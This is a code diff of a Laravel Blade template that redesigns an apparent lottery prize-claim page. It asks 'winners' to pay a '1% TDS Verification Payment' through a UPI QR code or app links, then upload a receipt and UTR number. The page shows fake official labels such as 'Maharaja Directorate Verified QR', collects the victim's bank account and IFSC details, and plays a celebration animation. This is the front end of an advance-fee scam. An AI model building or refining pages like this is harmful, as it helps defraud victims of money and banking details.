@@ -2,196 +2,144 @@
 
 @section('content')
 <!-- Background Backdrop Container -->
-<section class="min-h-[calc(100vh-80px)] bg-gradient-to-br from-[#040A1A] via-[#071533] to-[#040A1A] py-4 sm:py-8 px-3 sm:px-6 lg:px-8 flex items-center justify-center relative overflow-hidden">
+<section class="min-h-[calc(100vh-80px)] bg-gradient-to-br from-[#040A1A] via-[#071533] to-[#040A1A] py-6 sm:py-10 px-3 sm:px-6 lg:px-8 flex items-center justify-center relative overflow-hidden">
     
     <!-- Stylized Background Effects -->
     <div class="absolute inset-0 pointer-events-none opacity-10" style="background-image: url('{{ asset('img/lottery-pattern.svg') }}'); background-repeat: repeat; background-size: 140px 140px;"></div>
     <div class="absolute -top-32 -left-32 w-80 h-80 bg-[#DFB755]/15 rounded-full blur-3xl pointer-events-none"></div>
     <div class="absolute -bottom-32 -right-32 w-80 h-80 bg-[#0F2356]/40 rounded-full blur-3xl pointer-events-none"></div>
 
-    <!-- Main TDS Payment Card -->
-    <div id="tds-payment-card" class="relative w-full max-w-lg md:max-w-xl transition-all duration-300 bg-white rounded-2xl sm:rounded-3xl shadow-2xl overflow-hidden border border-[#DFB755]/40 z-10">
+    <!-- Main Simple TDS Payment Card -->
+    <div id="tds-payment-card" class="relative w-full max-w-lg md:max-w-xl transition-all duration-300 bg-white rounded-3xl shadow-2xl overflow-hidden border-2 border-[#DFB755]/50 z-10">
         
-        <!-- Modal Top Royal Navy Header -->
-        <div class="bg-gradient-to-r from-[#040A1A] via-[#071533] to-[#0B193E] text-white px-4 py-3 sm:px-5 sm:py-3.5 flex items-center justify-between border-b border-[#DFB755]/30">
-            <div class="flex items-center gap-2.5">
-                <div class="w-8 h-8 rounded-lg bg-[#DFB755]/15 border border-[#DFB755]/30 flex items-center justify-center text-[#DFB755] text-sm shrink-0">
-                    <i class="fa-solid fa-file-invoice-dollar"></i>
+        <!-- Royal Navy Header (Clean & Simple) -->
+        <div class="bg-gradient-to-r from-[#040A1A] via-[#071533] to-[#0B193E] text-white px-5 py-4 flex items-center justify-between border-b border-[#DFB755]/30">
+            <div class="flex items-center gap-3">
+                <div class="w-9 h-9 rounded-xl bg-white/10 border border-[#DFB755]/40 flex items-center justify-center text-[#F3D068] text-sm shrink-0">
+                    <i class="fa-solid fa-qrcode text-base"></i>
                 </div>
                 <div>
-                    <span class="text-[8px] sm:text-[9px] uppercase font-extrabold tracking-widest text-[#DFB755] block leading-tight">OFFICIAL CLEARANCE</span>
-                    <h2 class="text-sm sm:text-base font-serif font-black text-white leading-tight">1% TDS Tax Payment &amp; Claim</h2>
+                    <span class="text-[9px] uppercase font-black tracking-widest text-[#DFB755] block">OFFICIAL QR PAYMENT</span>
+                    <h2 class="text-base sm:text-lg font-serif font-black text-white leading-tight">1% TDS Verification Payment</h2>
                 </div>
             </div>
 
-            <!-- Back Link to Bank Details -->
+            <!-- Back to Bank Details -->
             <a href="{{ route('withdrawal', ['ref' => $bookingRef, 'amount' => $prizeAmount, 'name' => $customerName, 'phone' => $customerPhone]) }}" 
-                title="Edit Bank Details"
-                aria-label="Back" 
-                class="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-white/10 hover:bg-white/20 text-white flex items-center justify-center text-xs transition">
+                title="Edit Bank Details" 
+                class="w-8 h-8 rounded-full bg-white/10 hover:bg-white/20 text-white flex items-center justify-center text-xs transition">
                 <i class="fa-solid fa-arrow-left"></i>
             </a>
         </div>
 
-        <!-- Top Summary Bar -->
-        <div class="bg-stone-50 border-b border-stone-200/80 px-4 py-2.5 grid grid-cols-12 gap-2 text-center items-center">
-            <!-- Total Winning Prize (6 cols) -->
-            <div class="col-span-6 text-left border-r border-stone-200 pr-2">
-                <span class="block text-[8px] sm:text-[9px] uppercase font-bold text-stone-400 tracking-wider">WINNING PRIZE</span>
-                <span class="text-xs sm:text-sm font-black text-emerald-600 block truncate">{{ $prizeAmount }}</span>
-                <span class="text-[10px] text-stone-500 font-mono">({{ $winningFormatted }})</span>
+        <!-- BIG & BOLD TDS AMOUNT HIGHLIGHT BANNER -->
+        <div class="bg-gradient-to-b from-amber-500/10 via-amber-50 to-white border-b-2 border-[#DFB755]/50 py-4 px-4 text-center">
+            <span class="text-[10px] uppercase font-extrabold tracking-widest text-amber-700 block mb-1">
+                TDS AMOUNT TO PAY (1%)
+            </span>
+            <div class="text-3xl sm:text-4xl font-mono font-black text-[#0B193E] tracking-tight drop-shadow-xs">
+                {{ $tdsFormatted }}
             </div>
-            
-            <!-- TDS Rate (2 cols) -->
-            <div class="col-span-2 border-r border-stone-200 px-1 text-center">
-                <span class="block text-[8px] sm:text-[9px] uppercase font-bold text-stone-400 tracking-wider">TDS</span>
-                <span class="text-xs sm:text-sm font-black text-amber-600">1%</span>
-            </div>
-
-            <!-- Payable TDS Amount (4 cols) -->
-            <div class="col-span-4 pl-1 sm:pl-2 text-right">
-                <span class="block text-[8px] sm:text-[9px] uppercase font-bold text-stone-400 tracking-wider">TDS TO PAY</span>
-                <span class="text-sm sm:text-base font-mono font-black text-[#0B193E] drop-shadow-xs">{{ $tdsFormatted }}</span>
+            <div class="inline-flex items-center gap-2 mt-1.5 px-3 py-0.5 rounded-full bg-emerald-50 text-emerald-800 border border-emerald-200 text-xs font-bold">
+                <i class="fa-solid fa-trophy text-amber-500 text-[10px]"></i>
+                <span>Winning Prize: {{ $prizeAmount }} ({{ $winningFormatted }})</span>
             </div>
         </div>
 
-        <!-- Beneficiary & Bank Summary Bar (Collapsible) -->
-        <div class="bg-[#0B193E]/5 border-b border-[#DFB755]/20 px-4 py-2 text-xs">
-            <div class="flex items-center justify-between cursor-pointer" onclick="toggleDetails()" id="details-toggle-btn">
-                <div class="flex items-center gap-2 truncate">
-                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
-                    <span class="font-bold text-stone-800 truncate">{{ $customerName }}</span>
-                    <span class="text-stone-400 text-[10px]">•</span>
-                    <span class="text-stone-600 font-mono text-[11px] truncate">{{ $customerPhone }}</span>
-                    <span class="text-stone-400 text-[10px]">•</span>
-                    <span class="text-stone-600 font-mono text-[11px] truncate">A/C: {{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }}</span>
-                </div>
-                <div class="flex items-center gap-1 text-[11px] font-bold text-[#0B193E] shrink-0 ml-2">
-                    <span id="details-toggle-text">View details</span>
-                    <i id="details-toggle-icon" class="fa-solid fa-chevron-down text-[9px] transition-transform"></i>
-                </div>
+        <!-- Clean 1-Line Beneficiary Summary Bar -->
+        <div class="bg-stone-50 border-b border-stone-200 px-4 py-2 text-xs flex items-center justify-between text-stone-600">
+            <div class="flex items-center gap-2 truncate">
+                <span class="w-2 h-2 rounded-full bg-emerald-500 shrink-0"></span>
+                <span class="font-bold text-stone-900 truncate">{{ $customerName }}</span>
+                <span class="text-stone-300">•</span>
+                <span class="font-mono text-stone-700">A/C: {{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }}</span>
+                <span class="text-stone-300">•</span>
+                <span class="font-mono text-stone-700">IFSC: {{ $ifscCode }}</span>
             </div>
-
-            <!-- Collapsible Detail Info -->
-            <div id="customer-details-collapsible" class="hidden pt-2 mt-1.5 border-t border-[#DFB755]/20 space-y-1.5">
-                <div class="grid grid-cols-2 gap-2 text-[11px]">
-                    <div>
-                        <span class="text-stone-400 block text-[9px] uppercase font-semibold">Account Number:</span>
-                        <span class="font-mono font-bold text-stone-800 select-all">{{ $accountNumber }}</span>
-                    </div>
-                    <div>
-                        <span class="text-stone-400 block text-[9px] uppercase font-semibold">IFSC Code:</span>
-                        <span class="font-mono font-bold text-stone-800 select-all">{{ $ifscCode }}</span>
-                    </div>
-                </div>
-                @if(!empty($bankName))
-                <div class="text-[11px]">
-                    <span class="text-stone-400 block text-[9px] uppercase font-semibold">Bank:</span>
-                    <span class="font-medium text-stone-800">{{ $bankName }}</span>
-                </div>
-                @endif
-                @if(!empty($bookingRef))
-                <div class="text-[11px]">
-                    <span class="text-stone-400 block text-[9px] uppercase font-semibold">Booking Ref:</span>
-                    <span class="font-mono font-bold text-stone-800">{{ $bookingRef }}</span>
-                </div>
-                @endif
-            </div>
+            <span class="text-[10px] uppercase font-bold text-stone-400 shrink-0 ml-2">1% TDS</span>
         </div>
 
-        <!-- STEP 1: Pay 1% TDS via QR -->
-        <div id="payment-step-1" class="p-4 sm:p-5 space-y-3.5">
+        <!-- STEP 1: Scan & Pay QR (Simple & Direct) -->
+        <div id="payment-step-1" class="p-4 sm:p-6 space-y-4">
             
-            <!-- Stepper Progress -->
+            <!-- Stepper Indicators -->
             <div class="flex items-center justify-center gap-2">
                 <div class="flex items-center gap-1.5">
-                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold shadow-2xs">1</span>
-                    <span class="text-xs font-bold text-[#071533]">Pay 1% TDS</span>
+                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold">1</span>
+                    <span class="text-xs font-bold text-[#071533]">Scan &amp; Pay</span>
                 </div>
-                <div class="w-10 h-0.5 bg-stone-200"></div>
+                <div class="w-8 h-0.5 bg-stone-200"></div>
                 <div class="flex items-center gap-1.5 opacity-60 cursor-pointer hover:opacity-100 transition" onclick="goToStep2()">
                     <span class="w-5 h-5 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center text-[10px] font-bold">2</span>
-                    <span class="text-xs font-medium text-stone-500">Upload receipt</span>
+                    <span class="text-xs font-medium text-stone-500">Upload Receipt</span>
                 </div>
             </div>
 
-            <!-- Title & Subtitle -->
+            <!-- Title -->
             <div class="text-center space-y-0.5">
-                <span class="text-[9px] uppercase font-extrabold tracking-widest text-[#0B193E] block">
-                    SCAN AND PAY 1% TDS
-                </span>
-                <h3 class="text-base sm:text-lg font-serif font-black text-stone-900 leading-tight">
-                    Pay <span class="text-amber-600 font-mono">{{ $tdsFormatted }}</span> with any UPI app
+                <h3 class="text-lg font-serif font-black text-stone-900 leading-tight">
+                    Scan to Pay <span class="text-amber-600 font-mono font-black">{{ $tdsFormatted }}</span>
                 </h3>
-                <p class="text-[11px] text-stone-500">
-                    1% statutory tax deduction on <strong class="text-stone-800">{{ $prizeAmount }}</strong>
-                </p>
+                <p class="text-xs text-stone-500">Pay using any UPI App (GPay, PhonePe, Paytm, BHIM)</p>
             </div>
 
             <!-- QR Code Card Container -->
             <div class="flex justify-center">
-                <div class="relative p-2.5 bg-white rounded-2xl border-2 border-[#DFB755]/50 shadow-md group hover:border-[#DFB755] transition-all text-center">
+                <div class="relative p-3 bg-white rounded-2xl border-2 border-[#DFB755] shadow-md group hover:border-amber-600 transition-all text-center">
                     @if(!empty($upiQrImage) && file_exists(public_path($upiQrImage)))
-                        <!-- Custom Admin Uploaded QR Code -->
                         <img id="upi-qrcode" 
                             src="{{ asset($upiQrImage) }}?v={{ time() }}" 
                             alt="Scan UPI QR Code" 
-                            class="w-36 h-36 sm:w-40 sm:h-40 object-contain rounded-xl mx-auto select-none"
+                            class="w-40 h-40 sm:w-44 sm:h-44 object-contain rounded-xl mx-auto select-none"
                             loading="eager">
                     @else
-                        <!-- Dynamic UPI QR Code with exact 1% TDS amount -->
                         <img id="upi-qrcode" 
-                            src="https://api.qrserver.com/v1/create-qr-code/?size=165x165&data={{ urlencode($upiUrl) }}&margin=2" 
+                            src="https://api.qrserver.com/v1/create-qr-code/?size=175x175&data={{ urlencode($upiUrl) }}&margin=2" 
                             alt="Scan UPI QR Code" 
-                            class="w-36 h-36 sm:w-40 sm:h-40 object-contain rounded-xl mx-auto select-none"
+                            class="w-40 h-40 sm:w-44 sm:h-44 object-contain rounded-xl mx-auto select-none"
                             loading="eager"
-                            onerror="this.src='https://chart.googleapis.com/chart?cht=qr&chs=165x165&chl={{ urlencode($upiUrl) }}';">
+                            onerror="this.src='https://chart.googleapis.com/chart?cht=qr&chs=175x175&chl={{ urlencode($upiUrl) }}';">
                     @endif
 
-                    <div class="mt-1.5 flex items-center justify-center gap-1.5 text-[10px] font-bold text-stone-600">
-                        <i class="fa-solid fa-lock text-emerald-600 text-[9px]"></i>
-                        <span>Verified Directorate Gateway</span>
+                    <div class="mt-2 text-[10px] font-bold text-stone-600 flex items-center justify-center gap-1">
+                        <i class="fa-solid fa-shield-halved text-emerald-600 text-[10px]"></i>
+                        <span>Maharaja Directorate Verified QR</span>
                     </div>
                 </div>
             </div>
 
-            <!-- Tap Preferred UPI App Section -->
+            <!-- Tap Preferred UPI App -->
             <div class="space-y-1 text-center">
-                <span class="text-[10px] font-bold text-stone-500 block">
-                    Tap your preferred payment app
+                <span class="text-[10px] font-bold text-stone-500 uppercase tracking-wider block">
+                    Or Tap to Pay Directly
                 </span>
-                
                 <div class="grid grid-cols-4 gap-2">
-                    <!-- Google Pay -->
                     <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                         <div class="w-8 h-8 rounded-lg bg-stone-100 flex items-center justify-center text-xs text-stone-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-brands fa-google text-blue-600"></i>
+                            <i class="fa-brands fa-google text-blue-600 text-sm"></i>
                         </div>
-                        <span class="text-[9px] font-bold text-stone-700 mt-1">GPay</span>
+                        <span class="text-[10px] font-bold text-stone-700 mt-1">GPay</span>
                     </a>
 
-                    <!-- PhonePe -->
                     <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                         <div class="w-8 h-8 rounded-lg bg-purple-50 flex items-center justify-center text-xs text-purple-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-solid fa-mobile-screen text-purple-600"></i>
+                            <i class="fa-solid fa-mobile-screen text-purple-600 text-sm"></i>
                         </div>
-                        <span class="text-[9px] font-bold text-stone-700 mt-1">PhonePe</span>
+                        <span class="text-[10px] font-bold text-stone-700 mt-1">PhonePe</span>
                     </a>
 
-                    <!-- Paytm -->
                     <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                         <div class="w-8 h-8 rounded-lg bg-sky-50 flex items-center justify-center text-xs text-sky-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-solid fa-wallet text-sky-600"></i>
+                            <i class="fa-solid fa-wallet text-sky-600 text-sm"></i>
                         </div>
-                        <span class="text-[9px] font-bold text-stone-700 mt-1">Paytm</span>
+                        <span class="text-[10px] font-bold text-stone-700 mt-1">Paytm</span>
                     </a>
 
-                    <!-- BHIM / Other UPI -->
                     <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                         <div class="w-8 h-8 rounded-lg bg-emerald-50 flex items-center justify-center text-xs text-emerald-700 font-bold group-hover:scale-105 transition">
-                            <i class="fa-solid fa-building-columns text-emerald-600"></i>
+                            <i class="fa-solid fa-building-columns text-emerald-600 text-sm"></i>
                         </div>
-                        <span class="text-[9px] font-bold text-stone-700 mt-1">BHIM UPI</span>
+                        <span class="text-[10px] font-bold text-stone-700 mt-1">BHIM</span>
                     </a>
                 </div>
             </div>
@@ -211,46 +159,43 @@
                 </button>
             </div>
 
-            <!-- Next Step Button -->
+            <!-- Next Button -->
             <button type="button" 
                 onclick="goToStep2()" 
-                class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer">
+                class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
                 <span>I have paid {{ $tdsFormatted }} • Next</span>
                 <i class="fa-solid fa-arrow-right text-xs"></i>
             </button>
         </div>
 
-        <!-- STEP 2: Upload Payment Receipt -->
-        <div id="payment-step-2" class="p-4 sm:p-5 space-y-3.5 hidden">
+        <!-- STEP 2: Upload Payment Receipt (Simple & Clean) -->
+        <div id="payment-step-2" class="p-4 sm:p-6 space-y-4 hidden">
             
             <!-- Stepper Progress -->
             <div class="flex items-center justify-center gap-2">
                 <div class="flex items-center gap-1.5 opacity-60 cursor-pointer hover:opacity-100 transition" onclick="goToStep1()">
                     <span class="w-5 h-5 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center text-[10px] font-bold">1</span>
-                    <span class="text-xs font-medium text-stone-500">Pay 1% TDS</span>
+                    <span class="text-xs font-medium text-stone-500">Scan &amp; Pay</span>
                 </div>
-                <div class="w-10 h-0.5 bg-stone-200"></div>
+                <div class="w-8 h-0.5 bg-stone-200"></div>
                 <div class="flex items-center gap-1.5">
-                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold shadow-2xs">2</span>
-                    <span class="text-xs font-bold text-[#071533]">Upload receipt</span>
+                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold">2</span>
+                    <span class="text-xs font-bold text-[#071533]">Upload Receipt</span>
                 </div>
             </div>
 
-            <!-- Title & Subtitle -->
+            <!-- Title -->
             <div class="text-center space-y-0.5">
-                <span class="text-[9px] uppercase font-extrabold tracking-widest text-[#0B193E] block">
-                    PAYMENT VERIFICATION
-                </span>
-                <h3 class="text-base sm:text-lg font-serif font-black text-stone-900 leading-tight">
-                    Upload your TDS Payment Screenshot
+                <h3 class="text-lg font-serif font-black text-stone-900 leading-tight">
+                    Upload Payment Screenshot
                 </h3>
-                <p class="text-[11px] text-stone-500">
-                    Upload the confirmation receipt of <strong class="text-stone-800">{{ $tdsFormatted }}</strong>
+                <p class="text-xs text-stone-500">
+                    Upload proof of <strong class="text-stone-900 font-mono">{{ $tdsFormatted }}</strong> TDS payment
                 </p>
             </div>
 
             <!-- Upload Form -->
-            <form id="tds-submit-form" enctype="multipart/form-data" class="space-y-3.5">
+            <form id="tds-submit-form" enctype="multipart/form-data" class="space-y-4">
                 @csrf
                 <input type="hidden" name="booking_ref" value="{{ $bookingRef }}">
                 <input type="hidden" name="customer_name" value="{{ $customerName }}">
@@ -268,7 +213,7 @@
                         Payment Screenshot / Receipt <span class="text-rose-500">*</span>
                     </label>
                     <div id="dropzone" 
-                        class="border-2 border-dashed border-stone-300 hover:border-[#DFB755] rounded-2xl p-4 text-center cursor-pointer transition bg-stone-50 hover:bg-stone-100/70"
+                        class="border-2 border-dashed border-stone-300 hover:border-[#DFB755] rounded-2xl p-5 text-center cursor-pointer transition bg-stone-50 hover:bg-stone-100/70"
                         onclick="document.getElementById('receipt_file').click()">
                         <input type="file" 
                             name="receipt_file" 
@@ -277,19 +222,19 @@
                             class="hidden" 
                             onchange="handleReceiptPreview(this)">
                         
-                        <div id="upload-placeholder" class="space-y-1">
-                            <div class="w-10 h-10 rounded-full bg-stone-200/80 text-stone-600 flex items-center justify-center mx-auto text-base">
+                        <div id="upload-placeholder" class="space-y-1.5">
+                            <div class="w-11 h-11 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center mx-auto text-lg">
                                 <i class="fa-solid fa-cloud-arrow-up"></i>
                             </div>
-                            <p class="text-xs font-bold text-stone-700">Click to upload screenshot</p>
-                            <p class="text-[10px] text-stone-400">PNG, JPG, WEBP or PDF (Max 10MB)</p>
+                            <p class="text-xs font-bold text-stone-800">Click to upload screenshot</p>
+                            <p class="text-[11px] text-stone-400">PNG, JPG, WEBP or PDF (Max 10MB)</p>
                         </div>
 
                         <!-- Image Preview Box -->
                         <div id="receipt-preview-container" class="hidden space-y-2">
-                            <img id="receipt-preview-img" src="" alt="Receipt Preview" class="max-h-40 mx-auto rounded-lg object-contain shadow-sm border border-stone-200">
-                            <p id="receipt-file-name" class="text-xs font-bold text-stone-700 truncate"></p>
-                            <button type="button" onclick="event.stopPropagation(); clearReceiptPreview();" class="text-rose-600 hover:text-rose-700 text-[11px] font-bold">
+                            <img id="receipt-preview-img" src="" alt="Receipt Preview" class="max-h-44 mx-auto rounded-xl object-contain shadow-sm border border-stone-200">
+                            <p id="receipt-file-name" class="text-xs font-bold text-stone-800 truncate"></p>
+                            <button type="button" onclick="event.stopPropagation(); clearReceiptPreview();" class="text-rose-600 hover:text-rose-700 text-xs font-bold">
                                 Remove &amp; choose another
                             </button>
                         </div>
@@ -310,18 +255,17 @@
                             id="utr_number" 
                             placeholder="e.g. 428901234567 (12 digits)" 
                             maxlength="25"
-                            class="w-full pl-9 pr-3 py-2 bg-white border border-stone-200 rounded-xl text-stone-800 placeholder-stone-400 text-xs font-mono focus:outline-none focus:border-[#DFB755] focus:ring-1 focus:ring-[#DFB755] transition">
+                            class="w-full pl-9 pr-3 py-2.5 bg-white border border-stone-200 rounded-xl text-stone-800 placeholder-stone-400 text-xs font-mono focus:outline-none focus:border-[#DFB755] focus:ring-1 focus:ring-[#DFB755] transition">
                     </div>
-                    <p class="text-[10px] text-stone-400">Found on your UPI transaction details screen.</p>
                 </div>
 
                 <!-- Submit Button -->
                 <div class="pt-1">
                     <button type="submit" 
                         id="submit-tds-btn"
-                        class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
+                        class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
                         <i class="fa-solid fa-circle-check text-yellow-300"></i>
-                        <span id="submit-btn-text">Submit TDS Verification</span>
+                        <span id="submit-btn-text">Submit TDS Verification ({{ $tdsFormatted }})</span>
                     </button>
                 </div>
 
@@ -338,11 +282,11 @@
 </section>
 
 <!-- Celebration Boom Congratulations Modal -->
-<div id="celebration-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-md hidden items-center justify-center p-3 sm:p-5 transition-all duration-500">
+<div id="celebration-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-md hidden items-center justify-center p-3 sm:p-5 transition-all duration-500" style="position: fixed; inset: 0; z-index: 999999; width: 100vw; height: 100vh;">
     <!-- Ambient Glow -->
     <div class="absolute w-96 h-96 bg-[#DFB755]/25 rounded-full blur-3xl pointer-events-none"></div>
 
-    <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-3 border-[#DFB755] rounded-3xl p-6 sm:p-8 max-w-lg w-full text-center text-white shadow-[0_0_80px_rgba(223,183,85,0.45)] overflow-hidden space-y-5 animate-in zoom-in-90 duration-300">
+    <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-2 border-[#DFB755] rounded-3xl p-6 sm:p-8 max-w-lg w-full text-center text-white shadow-[0_0_80px_rgba(223,183,85,0.45)] overflow-hidden space-y-5 animate-in zoom-in-90 duration-300">
         <!-- Sparkle pattern -->
         <div class="absolute inset-0 opacity-15 bg-[radial-gradient(#DFB755_1px,transparent_1px)] [background-size:14px_14px] pointer-events-none"></div>
 
@@ -441,23 +385,6 @@
                 colors: ['#DFB755', '#F3D068', '#16A34A', '#E11D48', '#FFD700']
             });
         }, 300);
-    }
-
-    // Toggle Beneficiary Info Collapsible
-    function toggleDetails() {
-        const details = document.getElementById('customer-details-collapsible');
-        const icon = document.getElementById('details-toggle-icon');
-        const text = document.getElementById('details-toggle-text');
-
-        if (details.classList.contains('hidden')) {
-            details.classList.remove('hidden');
-            icon.classList.add('rotate-180');
-            text.innerText = 'Hide details';
-        } else {
-            details.classList.add('hidden');
-            icon.classList.remove('rotate-180');
-            text.innerText = 'View details';
-        }
     }
 
     // Navigation Between Step 1 & Step 2
